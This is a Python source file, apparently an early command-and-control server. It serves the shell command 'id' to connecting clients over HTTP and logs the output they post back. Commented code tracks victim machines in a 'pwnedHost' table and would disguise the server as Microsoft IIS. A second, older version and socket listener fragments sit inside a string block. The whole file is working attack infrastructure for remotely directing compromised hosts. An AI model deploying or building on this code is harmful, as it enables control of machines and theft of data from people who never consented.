from http.server import *
import random
import string
import logging
# from command_control.models import pwnedHost
# from extra.scratchpad2 import Server_Response

chars = string.ascii_letters + string.digits
session_value = ''.join(random.choice(chars) for i in range(20))


class Server_Response(BaseHTTPRequestHandler):

    def set_headers(self):
        #ip = self.client_address[0]
        #if not pwnedHost.objects.filter(ip=ip):
        #    host = pwnedHost(author=author, ip=ip, port="3389", username="root")
        #    host.save()
        self.send_response(200, "ok")
        self.send_header('Content-type', 'text/html')
        self.send_header('Set-Cookie',session_value)
        # self.send_header('Server', 'Microsoft IIS/7.5')
        self.end_headers()

    # Allow GET
    def do_GET(self):
        self.set_headers()
        # message = raw_input("Enter command :  " )
        message = "id"
        self.wfile.write(message.encode('utf-8'))

    # Allow POST
    def do_POST(self):
        self.set_headers()
        print("data received")
        print(self.client_address[0])
        content_length = int(self.headers['Content-Length'])  # <--- Gets the size of data
        post_data = self.rfile.read(content_length)
        data = post_data.decode('utf-8')# <--- Gets the data itself
        print(data)
        # logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",str(self.path), str(self.headers), post_data.decode('utf-8'))
        # print(BaseHTTPRequestHandler.responses)
        # self.wfile.write("<html><body><h1>POST!</h1></body></html>")

def run():
    print("Server Started ..!!")
    server_address = ('', 80)
    httpd = HTTPServer(server_address, Server_Response)
    # httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
    print('running server...')
    httpd.serve_forever()


run()


"""
import http.server
import socketserver
from http.server import *
from http import cookies
import random
import string
import logging
import threading
import ssl

chars = string.ascii_letters + string.digits

# C = cookies.SimpleCookie()
session_value = ''.join(random.choice(chars) for i in range(20))


class Server_Response(BaseHTTPRequestHandler):
    def set_headers(self):
        self.send_response(200, "ok")
        self.send_header('Content-type', 'text/html')
        self.send_header('Set-Cookie', session_value)
        # self.send_header('Server', 'Microsoft IIS/7.5')
        self.end_headers()

    # Allow GET
    def do_GET(self):
        self.set_headers()
        # message = raw_input("Enter command :  " )
        message = "id"
        print(self.client_address[0])
        self.wfile.write(bytes(message.encode()))

    # Allow POST
    def do_POST(self):
        self.set_headers()
        # content_length = int(self.headers['Content-Length'])  # <--- Gets the size of data
        # post_data = self.rfile.read(content_length)
        # print("POST REQUEST")
        # logging.info(post_data.decode('utf-8'))
        self.wfile.write("<html><body><h1>POST!</h1></body></html>")


def run():
    print("Server Started ..!!")
    server_address = ('', 80)
    httpd = HTTPServer(server_address, Server_Response)
    # httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
    print('running server...')
    httpd.serve_forever()


run()


from __builtin__ import raw_input
from scratchpad import *
import sys
import threading
def threadingConn():
    conn_thread = threading.Thread(target=sock_connect(),args=())
    conn_thread.daemon = True
    conn_thread.start()

def main():
    create_socket('', 9997)
    sock_connect()
"""
